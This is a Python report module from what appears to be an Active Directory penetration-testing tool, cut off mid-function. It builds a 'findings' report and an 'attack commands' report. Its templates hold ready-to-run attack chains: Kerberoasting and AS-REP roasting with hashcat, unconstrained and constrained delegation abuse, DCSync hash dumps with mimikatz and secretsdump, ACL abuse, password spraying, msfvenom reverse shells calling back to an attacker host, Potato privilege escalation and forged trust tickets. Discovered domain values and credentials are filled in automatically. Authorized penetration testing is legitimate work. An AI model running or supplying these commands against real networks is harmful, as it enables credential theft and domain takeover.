"""
report.py — Generates Report 1 (findings) and Report 2 (attack commands) as HTML + Markdown.

Report 1: linPEAS-style severity-colored findings list.
Report 2: Per-finding attack commands with pre-filled discovered values.
          Variable placeholders are rendered in orange so the user knows what to substitute.
"""

import os
import re
import json
from datetime import datetime
from core.parser import Finding, SEVERITY_COLOR, collect_loot


# ---------------------------------------------------------------------------
# Attack command templates
# Each entry maps a Finding.id to a list of command dicts:
#   {
#     "desc":    short description of what this command does,
#     "cmd":     command string — use {VAR} for pre-filled values, <VAR> for unknowns,
#     "note":    optional extra context (one line),
#   }
# ---------------------------------------------------------------------------

def _v(val):
    """Wrap a discovered value in a span for HTML (orange) or brackets for Markdown."""
    return f"__VAL__{val}__VAL__"   # sentinel replaced by renderer


ATTACK_TEMPLATES = {

    # -----------------------------------------------------------------------
    "kerberoastable_users": {
        "title": "Kerberoasting",
        "phase": "Credential Access",
        "steps": [
            {
                "desc": "Request TGS tickets for all SPN accounts (from Windows, authenticated)",
                "cmd":  'Rubeus.exe kerberoast /domain:{DOMAIN} /dc:{DC_IP} /outfile:{OUTPUT}\\kerberoast_hashes.txt',
            },
            {
                "desc": "Crack the hashes offline",
                "cmd":  'hashcat -m 13100 {OUTPUT}\\kerberoast_hashes.txt <WORDLIST> --force',
                "note": "Use rockyou.txt or a targeted wordlist. Mode 13100 = Kerberos 5 TGS-REP etype 23.",
            },
            {
                "desc": "Alternative: from Linux with valid creds",
                "cmd":  'impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request -outputfile {OUTPUT}/kerberoast_hashes.txt',
            },
            {
                "desc": "Alternative: from Linux with NTLM hash",
                "cmd":  'impacket-GetUserSPNs {DOMAIN}/{USERNAME} -hashes :{HASH} -dc-ip {DC_IP} -request -outputfile {OUTPUT}/kerberoast_hashes.txt',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "asrep_roastable": {
        "title": "AS-REP Roasting",
        "phase": "Credential Access",
        "steps": [
            {
                "desc": "Request AS-REP hashes — no credentials needed",
                "cmd":  'Rubeus.exe asreproast /domain:{DOMAIN} /dc:{DC_IP} /format:hashcat /outfile:{OUTPUT}\\asrep_hashes.txt',
            },
            {
                "desc": "Crack the hashes offline",
                "cmd":  'hashcat -m 18200 {OUTPUT}\\asrep_hashes.txt <WORDLIST> --force',
                "note": "Mode 18200 = Kerberos 5 AS-REP etype 23.",
            },
            {
                "desc": "Alternative: from Linux (no creds needed)",
                "cmd":  'impacket-GetNPUsers {DOMAIN}/ -usersfile <USERS_LIST> -dc-ip {DC_IP} -format hashcat -outputfile {OUTPUT}/asrep_hashes.txt',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "unconstrained_delegation": {
        "title": "Unconstrained Delegation → DC TGT Capture",
        "phase": "Privilege Escalation → Domain Takeover",
        "steps": [
            {
                "desc": "Compromise the machine with unconstrained delegation (your foothold must be on it or you must own it)",
                "cmd":  "# Already on the compromised machine: {EVIDENCE_0}",
            },
            {
                "desc": "Monitor for incoming TGTs (run this on the compromised machine)",
                "cmd":  'Rubeus.exe monitor /interval:5 /nowrap',
                "note": "Leave this running — it will catch any TGT that arrives.",
            },
            {
                "desc": "Coerce the DC to authenticate to you (PrinterBug / SpoolSample)",
                "cmd":  'SpoolSample.exe {DC_IP} {LOCAL_IP}',
                "note": "Alternatively use PetitPotam: impacket-PetitPotam {LOCAL_IP} {DC_IP}",
            },
            {
                "desc": "DC TGT will appear in Rubeus output — extract and inject it",
                "cmd":  'Rubeus.exe ptt /ticket:<BASE64_TICKET_FROM_RUBEUS>',
            },
            {
                "desc": "Now perform DCSync to dump all hashes",
                "cmd":  'mimikatz.exe "lsadump::dcsync /domain:{DOMAIN} /all /csv" exit',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "constrained_delegation": {
        "title": "Constrained Delegation Abuse (S4U2Proxy)",
        "phase": "Privilege Escalation",
        "steps": [
            {
                "desc": "Get a TGT for the delegating account (need its password or hash)",
                "cmd":  'Rubeus.exe asktgt /user:{EVIDENCE_0} /domain:{DOMAIN} /rc4:{HASH} /nowrap',
            },
            {
                "desc": "Use S4U2Self to get a ticket impersonating a DA, then S4U2Proxy to the delegated service",
                "cmd":  'Rubeus.exe s4u /ticket:<TGT_FROM_ABOVE> /impersonateuser:Administrator /msdsspn:<DELEGATED_SPN> /domain:{DOMAIN} /ptt',
            },
            {
                "desc": "Verify access",
                "cmd":  'ls \\\\{DC_IP}\\c$',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "acl_critical": {
        "title": "Critical ACL Abuse → DCSync / Group Membership",
        "phase": "Privilege Escalation",
        "steps": [
            {
                "desc": "If you have GenericAll/WriteDACL on the Domain object → grant yourself DCSync rights",
                "cmd":  'Add-DomainObjectAcl -TargetIdentity {DOMAIN} -PrincipalIdentity {USERNAME} -Rights DCSync -Verbose',
            },
            {
                "desc": "Then DCSync the domain (dump all password hashes)",
                "cmd":  'impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc-ntlm',
            },
            {
                "desc": "If GenericAll on a user → reset their password",
                "cmd":  'Set-DomainUserPassword -Identity {EVIDENCE_0} -AccountPassword (ConvertTo-SecureString "<NEWPASSWORD>" -AsPlainText -Force)',
            },
            {
                "desc": "If GenericAll on a group → add yourself",
                "cmd":  'Add-DomainGroupMember -Identity "<TARGET_GROUP>" -Members {USERNAME}',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "acl_high": {
        "title": "High-Risk ACL Abuse",
        "phase": "Privilege Escalation",
        "steps": [
            {
                "desc": "GenericWrite on a user → targeted Kerberoasting (set an SPN, request ticket, crack it)",
                "cmd":  'Set-DomainObject -Identity {EVIDENCE_0} -Set @{{serviceprincipalname="fake/spn"}}\nGet-DomainSPNTicket -SPN "fake/spn" | Export-Csv -NoTypeInformation -Path {OUTPUT}\\targeted_kerb.csv',
            },
            {
                "desc": "ForceChangePassword → reset password without knowing current one",
                "cmd":  '$pass = ConvertTo-SecureString "<NEWPASSWORD>" -AsPlainText -Force\nSet-DomainUserPassword -Identity {EVIDENCE_0} -AccountPassword $pass',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "no_lockout": {
        "title": "Password Spraying (No Lockout Policy)",
        "phase": "Credential Access",
        "steps": [
            {
                "desc": "Spray a single password against all domain users — safe since no lockout",
                "cmd":  'Invoke-DomainPasswordSpray -Password <PASSWORD> -Domain {DOMAIN} -OutFile {OUTPUT}\\spray_results.txt',
                "note": "Try common passwords: Season+Year (Summer2024!), company name variants, Welcome1!",
            },
            {
                "desc": "Alternative from Linux",
                "cmd":  'crackmapexec smb {DC_IP} -u <USERS_FILE> -p <PASSWORD> --continue-on-success',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "always_install_elevated": {
        "title": "AlwaysInstallElevated → SYSTEM Shell",
        "phase": "Local Privilege Escalation",
        "steps": [
            {
                "desc": "Generate a malicious MSI payload",
                "cmd":  'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o {OUTPUT}\\evil.msi',
            },
            {
                "desc": "Install it — runs as SYSTEM",
                "cmd":  'msiexec /quiet /qn /i {OUTPUT}\\evil.msi',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "unquoted_service_paths": {
        "title": "Unquoted Service Path Hijacking",
        "phase": "Local Privilege Escalation",
        "steps": [
            {
                "desc": "Identify the writable directory in the unquoted path",
                "cmd":  'icacls "<DIRECTORY_IN_PATH>"',
                "note": "You need (W) or (F) permissions on the directory.",
            },
            {
                "desc": "Generate payload and place it in the hijack location",
                "cmd":  'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o <HIJACK_PATH>.exe',
            },
            {
                "desc": "Restart the service (or wait for reboot)",
                "cmd":  'sc stop {EVIDENCE_0} && sc start {EVIDENCE_0}',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "weak_service_permissions": {
        "title": "Weak Service Permissions → SYSTEM",
        "phase": "Local Privilege Escalation",
        "steps": [
            {
                "desc": "Change the service binary path to your payload",
                "cmd":  'sc config {EVIDENCE_0} binpath= "cmd.exe /c <PAYLOAD_COMMAND>"',
            },
            {
                "desc": "Restart the service",
                "cmd":  'sc stop {EVIDENCE_0} && sc start {EVIDENCE_0}',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "autologon_creds": {
        "title": "AutoLogon Credentials → Lateral Movement",
        "phase": "Credential Access",
        "steps": [
            {
                "desc": "Read autologon creds from registry (if not already shown)",
                "cmd":  'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
            },
            {
                "desc": "Use the credentials to move laterally",
                "cmd":  'crackmapexec smb {DC_IP} -u <AUTOLOGON_USER> -p <AUTOLOGON_PASS>',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "token_privileges": {
        "title": "Token Privilege Abuse → SYSTEM (Potato / PrintSpoofer)",
        "phase": "Local Privilege Escalation",
        "steps": [
            {
                "desc": "SeImpersonatePrivilege detected → GodPotato (works on modern Windows)",
                "cmd":  'GodPotato.exe -cmd "cmd /c whoami > {OUTPUT}\\potato_test.txt"',
                "note": "Replace the cmd with your reverse shell payload.",
            },
            {
                "desc": "Alternative: PrintSpoofer",
                "cmd":  'PrintSpoofer64.exe -i -c "cmd.exe"',
            },
            {
                "desc": "Alternative: RoguePotato",
                "cmd":  'RoguePotato.exe -r <ATTACKER_IP> -e "cmd.exe" -l 9999',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "domain_trusts": {
        "title": "Cross-Domain Trust Abuse",
        "phase": "Privilege Escalation",
        "steps": [
            {
                "desc": "Enumerate trust details",
                "cmd":  'Get-DomainTrust -Domain {DOMAIN} | Format-List',
            },
            {
                "desc": "If bidirectional trust exists → forge inter-realm ticket (requires DA on child domain)",
                "cmd":  'mimikatz.exe "kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_DOMAIN_DA_SID> /ticket:{OUTPUT}\\trust_ticket.kirbi" exit',
            },
            {
                "desc": "Use the forged ticket",
                "cmd":  'Rubeus.exe ptt /ticket:{OUTPUT}\\trust_ticket.kirbi',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "password_not_required": {
        "title": "Empty / Blank Password Login",
        "phase": "Credential Access",
        "steps": [
            {
                "desc": "Try empty password against the account",
                "cmd":  'netexec smb {DC_IP} -u {EVIDENCE_0} -p ""',
            },
            {
                "desc": "Test WinRM with empty password",
                "cmd":  'evil-winrm -i {DC_IP} -u {EVIDENCE_0} -p ""',
            },
            {
                "desc": "LDAP bind with empty password (from Linux)",
                "cmd":  'netexec ldap {DC_IP} -u {EVIDENCE_0} -p ""',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "smb_shares": {
        "title": "SMB Share Enumeration & Credential Hunt",
        "phase": "Enumeration → Credential Access",
        "steps": [
            {
                "desc": "List all shares and permissions",
                "cmd":  'netexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --shares',
            },
            {
                "desc": "Spider shares and download interesting files",
                "cmd":  'netexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M spider_plus -o DOWNLOAD_FLAG=True',
            },
            {
                "desc": "Check SYSVOL for Group Policy with stored credentials (GPP passwords)",
                "cmd":  'netexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M gpp_password',
            },
            {
                "desc": "Mount a specific share for manual inspection",
                "cmd":  'smbclient //{DC_IP}/<SHARE_NAME> -U "{DOMAIN}\\{USERNAME}%{PASSWORD}"',
            },
        ]
    },

    # -----------------------------------------------------------------------
    "admincount_users": {
        "title": "AdminSDHolder ACL Abuse Paths",
        "phase": "Privilege Escalation",
        "steps": [
            {
                "desc": "Use BloodHound to find ACL paths leading to AdminSDHolder accounts",
                "cmd":  '# In BloodHound: Search → Shortest Paths to High Value Targets',
                "note": "AdminCount=1 accounts are protected by AdminSDHolder — check who has GenericAll/WriteDACL on them.",
            },
            {
                "desc": "Enumerate ACLs on a specific protected account with PowerView",
                "cmd":  'Get-DomainObjectAcl -Identity {EVIDENCE_0} -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner|GenericWrite" }',
            },
        ]
    },

}


# ---------------------------------------------------------------------------
# Value substitution
# ---------------------------------------------------------------------------

def _fill_template(cmd, config, finding):
    """Replace {VAR} tokens with real discovered values where possible."""
    target = config.get("target", {})
    auth   = config.get("auth", {})
    scope  = config.get("scope", {})

    replacements = {
        "DOMAIN":   target.get("domain", "<DOMAIN>"),
        "DC_IP":    target.get("dc_ip", "<DC_IP>"),
        "USERNAME": auth.get("username", "<USERNAME>"),
        "PASSWORD": auth.get("password", "<PASSWORD>"),
        "HASH":     auth.get("hash", "<NTLM_HASH>"),
        "OUTPUT":   scope.get("output_dir", "./output"),
        "LOCAL_IP": config.get("discovery", {}).get("network", {}).get("local_ip", "<LOCAL_IP>"),
    }

    # Evidence-based replacements
    evidence = finding.evidence
    for i, ev in enumerate(evidence[:5]):
        replacements[f"EVIDENCE_{i}"] = ev.split()[0] if ev.split() else ev

    def replace(m):
        key = m.group(1)
        if key in replacements and not replacements[key].startswith("<"):
            return _v(replacements[key])   # discovered value → highlight
        return f"<{key}>"                  # unknown → placeholder bracket

    return re.sub(r"\{(\w+)\}", replace, cmd)


# ---------------------------------------------------------------------------
# HTML report
# ---------------------------------------------------------------------------

HTML_TEMPLATE = """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>AD Recon — {REPORT_TITLE}</title>
<style>
  :root {{
    --bg:       #0d1117;
    --surface:  #161b22;
    --border:   #30363d;
    --text:     #e6edf3;
    --dim:      #8b949e;
    --critical: #ff4444;
    --high:     #ff8800;
    --medium:   #e3b341;
    --low:      #58a6ff;
    --info:     #8b949e;
    --orange:   #ff9f43;
    --green:    #3fb950;
    --code-bg:  #1c2128;
  }}
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 14px; line-height: 1.6; }}
  a {{ color: var(--orange); }}

  /* Layout */
  .container {{ max-width: 1100px; margin: 0 auto; padding: 32px 24px; }}
  header {{ border-bottom: 1px solid var(--border); padding-bottom: 24px; margin-bottom: 32px; }}
  header h1 {{ font-size: 28px; font-weight: 700; color: var(--text); }}
  header .meta {{ color: var(--dim); font-size: 12px; margin-top: 8px; }}

  /* Summary bar */
  .summary {{ display: flex; gap: 16px; margin-bottom: 32px; flex-wrap: wrap; }}
  .sev-badge {{ padding: 10px 20px; border-radius: 8px; font-weight: 700; font-size: 13px; border: 1px solid; }}
  .sev-CRITICAL {{ color: var(--critical); border-color: var(--critical); background: #ff44440f; }}
  .sev-HIGH     {{ color: var(--high);     border-color: var(--high);     background: #ff88000f; }}
  .sev-MEDIUM   {{ color: var(--medium);   border-color: var(--medium);   background: #e3b3410f; }}
  .sev-LOW      {{ color: var(--low);      border-color: var(--low);      background: #58a6ff0f; }}
  .sev-INFO     {{ color: var(--info);     border-color: var(--info);     background: #8b949e0f; }}

  /* Findings */
  .finding {{ background: var(--surface); border: 1px solid var(--border); border-radius: 10px; margin-bottom: 20px; overflow: hidden; }}
  .finding-header {{ display: flex; align-items: center; gap: 12px; padding: 14px 18px; cursor: pointer; user-select: none; }}
  .finding-header:hover {{ background: #1f2937; }}
  .sev-pill {{ font-size: 11px; font-weight: 700; padding: 2px 10px; border-radius: 20px; letter-spacing: 0.5px; flex-shrink: 0; }}
  .pill-CRITICAL {{ background: var(--critical); color: #000; }}
  .pill-HIGH     {{ background: var(--high);     color: #000; }}
  .pill-MEDIUM   {{ background: var(--medium);   color: #000; }}
  .pill-LOW      {{ background: var(--low);      color: #000; }}
  .pill-INFO     {{ background: var(--info);     color: #000; }}
  .finding-title {{ font-weight: 600; font-size: 15px; }}
  .finding-tool  {{ margin-left: auto; font-size: 11px; color: var(--dim); background: var(--border); padding: 2px 8px; border-radius: 4px; }}
  .finding-body  {{ padding: 16px 18px; border-top: 1px solid var(--border); display: none; }}
  .finding-body.open {{ display: block; }}
  .finding-desc  {{ color: var(--dim); margin-bottom: 12px; }}
  .evidence-list {{ background: var(--code-bg); border-radius: 6px; padding: 10px 14px; margin-bottom: 12px; }}
  .evidence-list li {{ font-family: 'Consolas', monospace; font-size: 12px; color: var(--text); list-style: none; padding: 2px 0; }}

  /* Code blocks */
  .cmd-block {{ margin-bottom: 18px; }}
  .cmd-desc {{ font-size: 12px; color: var(--dim); margin-bottom: 6px; font-style: italic; }}
  .cmd-note {{ font-size: 11px; color: var(--medium); margin-top: 4px; }}
  pre {{ background: var(--code-bg); border-radius: 6px; padding: 12px 16px; overflow-x: auto; font-family: 'Consolas', monospace; font-size: 13px; color: var(--text); border: 1px solid var(--border); white-space: pre-wrap; word-break: break-all; }}
  .val {{ color: var(--orange); font-weight: 700; }}      /* discovered/pre-filled values */
  .placeholder {{ color: #ff6b6b; opacity: 0.8; }}        /* <UNKNOWNS> the user must fill */

  /* Section headings */
  h2 {{ font-size: 20px; margin: 40px 0 16px; padding-bottom: 8px; border-bottom: 1px solid var(--border); }}
  h3 {{ font-size: 14px; color: var(--orange); margin-bottom: 8px; font-weight: 600; }}
  .phase-tag {{ font-size: 11px; color: var(--dim); background: var(--border); padding: 2px 8px; border-radius: 4px; margin-left: 8px; vertical-align: middle; }}

  /* Loot table */
  .loot-section { margin-bottom: 40px; }
  .loot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; margin-top: 16px; }
  .loot-card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
  .loot-card-header { padding: 10px 16px; font-size: 12px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; }
  .loot-card-body { padding: 0; }
  .loot-table { width: 100%; border-collapse: collapse; font-family: 'Consolas', monospace; font-size: 12px; }
  .loot-table td { padding: 6px 16px; border-bottom: 1px solid var(--border); color: var(--text); word-break: break-all; }
  .loot-table tr:last-child td { border-bottom: none; }
  .loot-table tr:hover td { background: #1f2937; }
  .loot-empty { padding: 10px 16px; color: var(--dim); font-size: 12px; font-style: italic; }
  .lh-red    {{ background: #ff44440f; color: var(--critical); border-bottom: 1px solid var(--border); }}
  .lh-orange {{ background: #ff88000f; color: var(--high);     border-bottom: 1px solid var(--border); }}
  .lh-yellow {{ background: #e3b3410f; color: var(--medium);   border-bottom: 1px solid var(--border); }}
  .lh-blue   {{ background: #58a6ff0f; color: var(--low);      border-bottom: 1px solid var(--border); }}
  .lh-gray   {{ background: #8b949e0f; color: var(--dim);      border-bottom: 1px solid var(--border); }}
  .lh-green  {{ background: #3fb9500f; color: var(--green);    border-bottom: 1px solid var(--border); }}

  /* BloodHound guide */
  .guide-box {{ background: var(--surface); border: 1px solid var(--border); border-left: 4px solid var(--green); border-radius: 8px; padding: 16px 20px; margin-bottom: 24px; }}
  .guide-box h3 {{ color: var(--green); }}
  .guide-box ol {{ padding-left: 20px; color: var(--dim); }}
  .guide-box ol li {{ margin-bottom: 6px; }}
  .guide-box code {{ background: var(--code-bg); padding: 1px 6px; border-radius: 3px; font-size: 12px; }}
</style>
</head>
<body>
<div class="container">

<header>
  <h1>🔍 {REPORT_TITLE}</h1>
  <div class="meta">
    Generated: {TIMESTAMP} &nbsp;|&nbsp;
    Domain: <strong>{DOMAIN}</strong> &nbsp;|&nbsp;
    DC: <strong>{DC_IP}</strong> &nbsp;|&nbsp;
    User: <strong>{USERNAME}</strong>
  </div>
</header>

{BODY}

</div>
<script>
document.querySelectorAll('.finding-header').forEach(h => {{
  h.addEventListener('click', () => {{
    h.nextElementSibling.classList.toggle('open');
  }});
}});
</script>
</body>
</html>
"""


def _severity_counts(findings):
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1
    return counts


def _summary_bar(findings):
    counts = _severity_counts(findings)
    parts  = []
    for sev, count in counts.items():
        if count:
            parts.append(f'<div class="sev-badge sev-{sev}">{sev}: {count}</div>')
    return '<div class="summary">' + "\n".join(parts) + "</div>"


def _render_cmd_html(cmd_str):
    """Color discovered values (orange) and placeholders (red) inside a <pre>."""
    # sentinel values → orange span
    cmd_str = re.sub(r"__VAL__(.+?)__VAL__", r'<span class="val">\1</span>', cmd_str)
    # <PLACEHOLDER> → red span
    cmd_str = re.sub(r"&lt;([A-Z_]+)&gt;", r'<span class="placeholder">&lt;\1&gt;</span>', cmd_str)
    return cmd_str


def _html_escape(s):
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _finding_card_html(finding):
    pill  = f'<span class="sev-pill pill-{finding.severity}">{finding.severity}</span>'
    tool  = f'<span class="finding-tool">{finding.tool}</span>'
    title = f'<span class="finding-title">{_html_escape(finding.title)}</span>'

    header = f'<div class="finding-header">{pill}{title}{tool}</div>'

    desc = f'<p class="finding-desc">{_html_escape(finding.description)}</p>'

    evidence_items = "".join(f"<li>{_html_escape(e)}</li>" for e in finding.evidence[:20])
    evidence = f'<ul class="evidence-list">{evidence_items}</ul>' if evidence_items else ""

    body = f'<div class="finding-body">{desc}{evidence}</div>'

    return f'<div class="finding">{header}{body}</div>'


def _attack_card_html(finding, config):
    template = ATTACK_TEMPLATES.get(finding.id)
    if not template:
        return ""

    phase_tag = f'<span class="phase-tag">{_html_escape(template["phase"])}</span>'
    heading   = f'<h3>{_html_escape(template["title"])}{phase_tag}</h3>'

    blocks = []
    for step in template["steps"]:
        cmd_raw  = _fill_template(step["cmd"], config, finding)
        cmd_html = _render_cmd_html(_html_escape(cmd_raw))
        # Re-apply val spans that got escaped — fix: don't escape our sentinels
        cmd_html_fixed = re.sub(
            r"__VAL__(.+?)__VAL__",
            r'<span class="val">\1</span>',
            _html_escape(step["cmd"])  # escape original, then substitute
        )
        cmd_html_fixed = _render_cmd_html(cmd_html_fixed)

        desc = f'<div class="cmd-desc">{_html_escape(step["desc"])}</div>'
        note = f'<div class="cmd-note">⚠ {_html_escape(step["note"])}</div>' if step.get("note") else ""
        pre  = f'<pre>{cmd_html}</pre>'
        blocks.append(f'<div class="cmd-block">{desc}{pre}{note}</div>')

    return f'<div class="finding">' \
           f'<div class="finding-header"><span class="finding-title">{_html_escape(finding.title)}</span></div>' \
           f'<div class="finding-body open">{heading}{"".join(blocks)}</div></div>'


def _bloodhound_guide_html(raw_dir):
    zip_path = ""
    if raw_dir and os.path.exists(raw_dir):
        for f in os.listdir(raw_dir):
            if f.endswith(".zip") and "bloodhound" in f.lower():
                zip_path = os.path.join(raw_dir, f)
                break

    zip_line = f"<li>SharpHound ZIP file: <code>{_html_escape(zip_path)}</code></li>" if zip_path else \
               "<li>SharpHound ZIP not found in output directory — run SharpHound manually.</li>"

    return f"""
<div class="guide-box">
  <h3>BloodHound — How to Load Your Data</h3>
  <ol>
    {zip_line}
    <li>Open <strong>BloodHound</strong> and connect to your Neo4j database.</li>
    <li>Click <strong>Upload Data</strong> (top right) and select the ZIP file above.</li>
    <li>After upload, try these queries in the search bar:</li>
    <ul style="padding-left:20px;margin-top:8px;">
      <li><code>Find Shortest Paths to Domain Admins</code></li>
      <li><code>Find Principals with DCSync Rights</code></li>
      <li><code>List All Kerberoastable Accounts</code></li>
      <li><code>Find AS-REP Roastable Users</code></li>
      <li><code>Shortest Paths to Unconstrained Delegation Systems</code></li>
    </ul>
  </ol>
</div>
"""


# ---------------------------------------------------------------------------
# Loot table
# ---------------------------------------------------------------------------

_LOOT_TABLE_CSS = """
  .loot-section { margin-bottom: 40px; }
  .loot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; margin-top: 16px; }
  .loot-card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
  .loot-card-header { padding: 10px 16px; font-size: 12px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; }
  .loot-card-body { padding: 0; }
  .loot-table { width: 100%; border-collapse: collapse; font-family: 'Consolas', monospace; font-size: 12px; }
  .loot-table td { padding: 6px 16px; border-bottom: 1px solid var(--border); color: var(--text); word-break: break-all; }
  .loot-table tr:last-child td { border-bottom: none; }
  .loot-table tr:hover td { background: #1f2937; }
  .loot-empty { padding: 10px 16px; color: var(--dim); font-size: 12px; font-style: italic; }

  /* Card accent colors */
  .lh-red    { background: #ff44440f; color: var(--critical); border-bottom: 1px solid var(--border); }
  .lh-orange { background: #ff88000f; color: var(--high);     border-bottom: 1px solid var(--border); }
  .lh-yellow { background: #e3b3410f; color: var(--medium);   border-bottom: 1px solid var(--border); }
  .lh-blue   { background: #58a6ff0f; color: var(--low);      border-bottom: 1px solid var(--border); }
  .lh-gray   { background: #8b949e0f; color: var(--dim);      border-bottom: 1px solid var(--border); }
  .lh-green  { background: #3fb9500f; color: var(--green);    border-bottom: 1px solid var(--border); }
"""


def _loot_card(title, items, color_class, badge_items=None):
    """Render a single loot card."""
    header = f'<div class="loot-card-header {color_class}">{_html_escape(title)}</div>'

    if not items:
        body = f'<div class="loot-empty">Nothing found</div>'
    else:
        rows = ""
        for item in items[:30]:
            # Highlight DA names in red, everything else normal
            cell = _html_escape(str(item))
            if badge_items and item in badge_items:
                cell = f'<span style="color:var(--critical);font-weight:700;">{cell} ★</span>'
            rows += f"<tr><td>{cell}</td></tr>"
        body = f'<table class="loot-table"><tbody>{rows}</tbody></table>'

    return f'<div class="loot-card">{header}<div class="loot-card-body">{body}</div></div>'


def _loot_table_html(loot):
    """Render the full loot summary grid."""
    da_set = set(loot.get("domain_admins", []))

    cards = [
        _loot_card("Domain Users",           loot["domain_users"],       "lh-blue",   badge_items=da_set),
        _loot_card("Domain Admins",           loot["domain_admins"],      "lh-red"),
        _loot_card("Domain Controllers",      loot["domain_controllers"], "lh-orange"),
        _loot_card("Domain Computers",        loot["domain_computers"],   "lh-gray"),
        _loot_card("Kerberoastable Accounts", loot["kerberoastable"],     "lh-orange"),
        _loot_card("AS-REP Roastable",        loot["asrep_roastable"],    "lh-orange"),
        _loot_card("Service Principal Names", loot["spns"],               "lh-yellow"),
        _loot_card("NTLM Hashes Found",       loot["hashes_found"],       "lh-red"),
        _loot_card("Cleartext Passwords",     loot["passwords_found"],        "lh-red"),
        _loot_card("Constrained Delegation",  loot.get("constrained_delegation", []), "lh-orange"),
        _loot_card("Password Policy",         loot["password_policy"],        "lh-blue"),
        _loot_card("Domain Trusts",           loot["domain_trusts"],      "lh-yellow"),
        _loot_card("GPOs",                    loot["gpos"],               "lh-gray"),
        _loot_card("Interesting Files",       loot["interesting_files"],  "lh-yellow"),
    ]

    return (
        f'<div class="loot-section">'
        f'<h2>Intelligence Summary</h2>'
        f'<p style="color:var(--dim);margin-bottom:8px;">Everything collected at a glance. '
        f'Domain Admin members are marked with ★.</p>'
        f'<div class="loot-grid">{"".join(cards)}</div>'
        f'</div>'
    )


# ---------------------------------------------------------------------------
# Report 1 — Findings
# ---------------------------------------------------------------------------

def generate_report1_html(findings, config, output_dir, loot=None):
    target = config.get("target", {})
    auth   = config.get("auth", {})

    summary    = _summary_bar(findings)
    loot_html  = _loot_table_html(loot) if loot else ""
    cards      = "\n".join(_finding_card_html(f) for f in findings)

    body = f"""
<h2>Summary</h2>
{summary}

{loot_html}

<h2>Findings</h2>
<p style="color:var(--dim);margin-bottom:16px;">Click any finding to expand details.</p>
{cards}
"""

    html = HTML_TEMPLATE.format(
        REPORT_TITLE = "Report 1 — Findings & Enumeration",
        TIMESTAMP    = datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        DOMAIN       = target.get("domain", "N/A"),
        DC_IP        = target.get("dc_ip", "N/A"),
        USERNAME     = auth.get("username") or config.get("discovery", {}).get("user", {}).get("username", "N/A"),
        BODY         = body,
    )

    path = os.path.join(output_dir, "report1_findings.html")
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    return path


# ---------------------------------------------------------------------------
# Report 2 — Attack Commands
# ---------------------------------------------------------------------------

def generate_report2_html(findings, config, output_dir):
    target  = config.get("target", {})
    auth    = config.get("auth", {})
    raw_dir = os.path.join(output_dir, "raw")

    # Only include findings that have attack templates
    actionable = [f for f in findings if f.id in ATTACK_TEMPLATES]

    bloodhound = _bloodhound_guide_html(raw_dir)
    cards      = "\n".join(_attack_card_html(f, config) for f in actionable)

    legend = """
<div style="margin-bottom:24px;padding:12px 16px;background:var(--surface);border-radius:8px;border:1px solid var(--border);">
  <strong>Legend:</strong>&nbsp;
  <span style="color:var(--orange);font-weight:700;">Orange values</span> = pre-filled from discovered data &nbsp;|&nbsp;
  <span style="color:#ff6b6b;">&lt;PLACEHOLDER&gt;</span> = you must fill this in
</div>
"""

    body = f"""
<h2>BloodHound Data</h2>
{bloodhound}

<h2>Attack Commands</h2>
{legend}
{cards}
"""

    html = HTML_TEMPLATE.format(
        REPORT_TITLE = "Report 2 — Attack Commands",
        TIMESTAMP    = datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        DOMAIN       = target.get("domain", "N/A"),
        DC_IP        = target.get("dc_ip", "N/A"),
        USERNAME     = auth.get("username") or config.get("discovery", {}).get("user", {}).get("username", "N/A"),
        BODY         = body,
    )

    path = os.path.join(output_dir, "report2_attack_commands.html")
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    return path


# ---------------------------------------------------------------------------
# Markdown report (combined, plain text friendly)
# ---------------------------------------------------------------------------

def _md_val(v):
    return f"`{v}`"


def generate_markdown(findings, config, output_dir):
    target = config.get("target", {})
    auth   = config.get("auth", {})
    lines  = []

